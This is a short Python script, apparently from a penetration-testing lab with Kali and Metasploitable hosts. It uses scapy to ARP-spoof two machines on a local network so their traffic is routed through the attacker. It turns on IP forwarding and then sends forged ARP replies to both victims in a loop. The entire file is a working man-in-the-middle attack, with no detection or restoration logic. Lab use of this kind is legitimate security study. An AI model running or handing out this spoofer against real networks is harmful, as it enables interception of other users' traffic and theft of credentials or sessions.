from scapy.all import ARP, send
import time
import os

# IPs of the two victims
target1_ip = "192.168.100.58"  # Metasploitable
target2_ip = "192.168.100.63"  # Windows
iface = "eth0"  # Interface in Kali

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(packet, iface=iface, verbose=False)

def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def main():
    print("[*] Enabling IP Forwarding...")
    enable_ip_forwarding()
    print("[*] Starting ARP spoofing... Press CTRL+C to stop.")
    try:
        while True:
            spoof(target1_ip, target2_ip)
            spoof(target2_ip, target1_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopping...")

if __name__ == "__main__":
    main()
